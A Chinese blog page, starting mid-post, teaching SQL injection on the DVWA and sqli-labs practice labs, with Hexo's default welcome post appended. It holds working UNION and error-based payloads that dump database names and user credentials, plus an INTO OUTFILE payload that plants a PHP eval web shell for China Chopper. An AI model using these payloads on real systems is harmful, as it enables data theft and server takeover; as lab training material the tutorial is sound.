<pre><code>Select * from admin where username=’admin’ and password=’’ or 1=1</code></pre><p>在sql语句中，and的优先级是大于or的。username=’admin’的条件（1）为真，password=’’的条件（2）是假的<br>那么1 and 2=false，在与第三个条件 1=1（3）为真 进行 false or 3=true，结果就是真。 所以，有时候在执行sql注入，执行的语句后就会加上 or 1=1，目的就是利用sql and 和 or 运算符的优先级的差别，来达到用户想要的目的（语句为真，执行输入的语句）</p>
<h2 id="0x02什么是sql注入"><a href="#0x02什么是sql注入" class="headerlink" title="#0x02什么是sql注入?:"></a>#0x02什么是sql注入?:</h2><pre><code>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</code></pre><p>简单的说就是网页的后台没有对用户发送的语句（以参数的方式传递）进行过滤，使得用户发送的语句直接被sql解释器执行。</p>
<h2 id="0x03原理分析："><a href="#0x03原理分析：" class="headerlink" title="#0x03原理分析："></a>#0x03原理分析：</h2><p>我们可以利用DVWA平台去分析sql注入的原理，DVWA的平台搭建和sqli-labs和upload-labs类似，首先需要php运行环境。把下载的文件夹放到网站根目录（WWW）。</p>
<pre><code>&lt;?php

if( isset( $_REQUEST[ &apos;Submit&apos; ] ) ) {
    // Get input
    $id = $_REQUEST[ &apos;id&apos; ];

    // Check database
    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;;
    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row[&quot;first_name&quot;];
        $last  = $row[&quot;last_name&quot;];

        // Feedback for end user
        $html .= &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;
    }

    mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);
}

?&gt;</code></pre><p><img src="/%E6%8D%95%E8%8E%B73.png" alt></p>
<p>如果用户在userid文本框输入ID，输入的语句就会作为id参数的值通过GET(POST)方法提交到后台。通过sql解释器执行，并返回数据库查询的结果。也就是说，如果id传入的不只是一个数字，而是一条语句那么id的值就会被sql解释器执行。例如，用户令id=1’ and 1=1 order by 4 #,那么$query就会变成</p>
<pre><code>$query=&quot;SELECT first_name,last_name FROM users WHERE user_id=&apos;1&apos; and 1=1 order by 4#&quot;</code></pre><p>这样就能查询数据库信息了</p>
<h1 id="0x05sqli-labs"><a href="#0x05sqli-labs" class="headerlink" title="0x05sqli-labs"></a>0x05sqli-labs</h1><hr>
<p>sqli-labs是基于php环境的平台，使用前需要安装php集成环境（php+apache+mysql,部分关卡需要tomcat+java+mysql）。</p>
<p>sqli-labs下载地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p>
<p>这里还有一个sqli-labs原作者的教程：<a href="https://www.bilibili.com/video/av24783387?t=69" target="_blank" rel="noopener">https://www.bilibili.com/video/av24783387?t=69</a></p>
<p><strong>下面结合sqli-labs上的一些基础题目来介绍一些简单的sql注入方式。</strong></p>
<h1 id="0x06less01-联合查询"><a href="#0x06less01-联合查询" class="headerlink" title="0x06less01(联合查询)"></a>0x06less01(联合查询)</h1><hr>
<p>在了解题目要求之前，我们先来认识一下sql语句中union操作符。</p>
<p>union操作符的作用是合并多个select语句的结果集，但是使用union时，要保证union操作符内部的select语句要有相同的列</p>
<p>具体语法：</p>
<pre><code>select column1 from table1 union select column2 from table2</code></pre><p>注意：union操作符是不会返回相同的值。</p>
<p>union all</p>
<p>作用与union类似，都是合并多个select语句的结果集，但是可以返回重复的值。</p>
<p>题目要求：让用户上传一个参数’id’。</p>
<p><strong>1.判断注入点</strong></p>
<p>首先我们要找到注入点，判断注入点的常用方法之一就是在参数后加上一个单引号或双引号（因为sql语句添加引号会影响到sql语句的闭合，从而报错），如果报错，就可能存在注入点。当然，手工判断注入点的方法还有利用and运算符（and 1=1,and 1=2 ,and ‘1’=1）,利用特殊字符报错等等，在这里，就不详细介绍了。</p>
<p>通过尝试可以发现添加单引号后页面会有报错信息，说明页面存在注入点。</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy85MjE2NjMxLWY1NTlmNDUyMmUyYjQ0ZjMucG5n?x-oss-process=image/format,png" alt></p>
<p>接下来就可以构造?id= 1’ ****语句实现注入了。</p>
<p><strong>2.使用 order by子句判断数据库的列数</strong></p>
<p>前面已经介绍了order by子句的作用，当order by子句后面的数字大于当前数据库的列数，语句就会出错。</p>
<p>输入id=1’ order by 4–+发现页面返回信息 “unknown columns ‘4’” 说明当前数据库的列数是小于4的。</p>
<p><img src="https://img-blog.csdnimg.cn/20191005170005919.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
<p>输入id=1’ order by 3–+发现页面返回了用户的name password 说明当前数据库的列数刚好等于3，下面就可以构造 select 1，2，3 ***** 来获取数据库的相应信息了。</p>
<p><strong>3.利用 information_schema库</strong></p>
<p>如果继续学习sql注入就会发现select语句经常会用到information_schema这个库来获取数据库的（表，列，字段）的信息。information_schema是mysql自带的数据库，只要用户安装了mysql，在安装的同时，information<br>_schema这个数据库就会安装到用户的系统中.</p>
<p>在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。也就是说information_schema中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。因此，在sql注入中就可以利用information_schema这个库获取其他数据库的信息.</p>
<p>SCHEMATA表:</p>
<p>SCHEMATA 表存储了 Mysql 数据库中所有库相关的信息，比如订单库、用户库这种不同的库。可以在mysql命令行中使用下述语句进行查看：</p>
<p>select * from information_schema.schemata;</p>
<p>TABLES表:<br>TABLES 表存储了 Mysql 数据库中表的信息。会记录这张表是属于哪个数据库(TABLE_SCHEMA)，是做什么的表(表注释)，多会创建的(CREATE_TIME)，有多少行数据(INDEX_LENGTH)等信息。</p>
<p>select* frominformation_schema.TABLES;</p>
<p>COLUMNS表:</p>
<p>COLUMNS 表存储了 Mysql 数据库中每张表中的列信息。会记录这列是属于哪张表(TABLE_NAME)、以及哪个库(TABLE_SCHEMA)、这列的数据类型是什么、列的注释(COLUMN_COMMENT)等信息。</p>
<p>select* frominformation_schema.COLUMNS<br>COLUMNS 表中字段 COLUMN_COMMENT 是关于列的注释信息，一般会标明这个列是什么字段，不同的数字代表什么含义(0代表什么、1代表什么)。</p>
<p><strong>4.开始注入</strong></p>
<p>获取数据库的名字:</p>
<pre><code>?id=-1&apos; union select 1,group_concat(schema_name),3 from information_schema.schemata--+//group_concat()函数是把一组中的非NULL字符串合并为一个字符串的函数</code></pre><p><img src="https://img-blog.csdnimg.cn/20191005181042833.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
<p>获取security数据库的表名:</p>
<pre><code>?id=-1&apos; union select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema=&apos;security&apos;--+</code></pre><p><img src="https://img-blog.csdnimg.cn/20191005190150598.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
<p>获取users表的列:</p>
<pre><code>?id=-1&apos; union select 1,group_concat(column_name),3 from infromation_schema.columns where  table_name=&apos;users&apos;--+</code></pre><p><img src="https://img-blog.csdnimg.cn/2019100519070977.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
<p>获取username ,password:</p>
<pre><code>?id=-1&apos; union select 1,group_concat(concat_ws(&apos;:&apos;,username,password)),3 from users--+//concat_ws函数是把一组非NULL字符串拼接为一个字符串，与concat函数相比主要不同是可以一次指定分隔符</code></pre><p><img src="https://img-blog.csdnimg.cn/20191005190933714.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
<h2 id="0x07less05报错注入"><a href="#0x07less05报错注入" class="headerlink" title="#0x07less05报错注入"></a>#0x07less05报错注入</h2><p>这关如果直接用联合查询的话,页面只会返回”You are in”,而不能返回数据库的信息。这时我们就可以尝试别的方法,比如时间注入,报错注入,布尔注入等等。在这一关可以使用报错注入来返回数据库的信息。</p>
<p><strong>1报错注入的原理:</strong></p>
<p>正常用户访问服务器发送id信息返回正确的id数据。报错注入是想办法构造语句，让错误信息中可以显示数据库的内容；如果能让错误信息中返回数据库中的内容，即实现SQL注入。</p>
<p><strong>2.利用group by和rand()的冲突直接报错注入</strong></p>
<p>group by的作用和order by的作用类似,都是对结果集排序(默认升序).而rand()是产生随机数的函数,类似于java的Math.random()。产生一个[0,1)区间的数.如rand()*2,则产生一个[0,2)区间的数。当rand() 和order by 在一起使用时，就会发生冲突。</p>
<p>由于rand和order+by的冲突，即rand()是不可以作为order by的条件字段,同理 也不可以为group by的条件字段。floor(rand(0)*2) 获取不确定又重复的值造成mysql的错误</p>
<p>rand和group by冲突的具体原因</p>
<p><strong>3.开始注入</strong></p>
<p>获取数据库的名字：</p>
<pre><code>?id=1&apos; union select 1,count(*),concat(&apos;:&apos;,(select database()),&apos;:&apos;,floor(rand()*2))a from information_schema.schemata group by a--+//</code></pre><p>其中concat函数的作用和之前group_concat()函数类似也是把一组非NULL字符串拼接为一个字符串。a是 as a的别名。然后返回值不能超过1行数据，所以如果里面的select获取的是多行数据时要加limit（查询多组用limit选择）</p>
<p>获取表：</p>
<pre><code>?id=1&apos; union select 1,count(*),concat(&apos;:&apos;,(select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),&apos;:&apos;,floor(rand(0)*2))a from information_schema.tables  group by a--+</code></pre><p>获取列：</p>
<pre><code>?id=1&apos; union select 1,count(*),concat(&apos;:&apos;,(select column_name  from   information_schema.columns where table_name=&apos;users&apos;limit 0,1),&apos;:&apos;,floor(rand(0)*2))a from   information_schema.columns  group by a--+</code></pre><p>获取username， password:</p>
<pre><code>?id=1&apos; union select 1,count(*),concat(&apos;:&apos;,(select concat_ws(&apos;`&apos;,username,password) from users limit 0,1),&apos;:&apos;,floor(rand(0*2))) a from users group by a--+</code></pre><p>有关报错注入的方法还有很多，这里就不详细介绍了。</p>
<h2 id="0x08less07上传一句话木马"><a href="#0x08less07上传一句话木马" class="headerlink" title="#0x08less07上传一句话木马"></a>#0x08less07上传一句话木马</h2><p>先在id=1后加上单引号和双引号，页面都显示正常，但是在参数后加上注释，会报错，说明系统过滤注释符。并且sql语句id参数前后很有可能加了（），尝试了很多次发现构造:“id’ =1 ))”,可以使注释不被过滤。</p>
<p><img src="https://img-blog.csdnimg.cn/20191009171549118.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt><br>但是之后尝试 union,报错注入发现不能返回需要的信息（可以用布尔和时间盲注）。不过，本题提示利用file权限向服务器传入文件。那么，先看看是否能传入<br>构造语句：<br><a href="http://localhost/sqli-labs-master/Less-7/?id=1’" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-7/?id=1’</a>)) and (select count(*) from mysql.user)&gt;0–<br>返回正常说明我们有这个权限.<br><img src="https://img-blog.csdnimg.cn/20191009172804632.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt><br>然后把一句话木马发送到网页，构造语句：id=-1’)) union select 1,2,”&lt;?php</p>
<p>@eval($_POST[‘shell’])?&gt; into outfile “<strong><strong>* \test.php” (**</strong></strong>为网页的目录,test.php为上传的一句话木马文件）。<br>连上中国菜刀，发现能够连接成功，说明注入成功（网页根目录有一句话木马说明上传成功）。</p>
<h2 id="0x09"><a href="#0x09" class="headerlink" title="#0x09"></a>#0x09</h2>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/10/22/新文档/" data-id="ck7lp33e80006osv97g1j2b2w" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/06/04/hello-world/" class="article-date">
  <time datetime="2019-06-04T10:51:05.224Z" itemprop="datePublished">2019-06-04</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/06/04/hello-world/">Hello World</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/06/04/hello-world/" data-id="ck7lp33d30002osv940lvst52" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/03/10/leetcode-dynamic-programming-2/">leetcode-dynamic programming-2</a>
          </li>
        
          <li>
            <a href="/2020/02/29/Metasploit学习笔记/">(no title)</a>
          </li>
        
          <li>
            <a href="/2020/02/25/leetcode-动态规划-1/">(no title)</a>
          </li>
        
          <li>
            <a href="/2019/12/02/xss/">(no title)</a>
          </li>
        
          <li>
            <a href="/2019/10/22/新文档/">(no title)</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>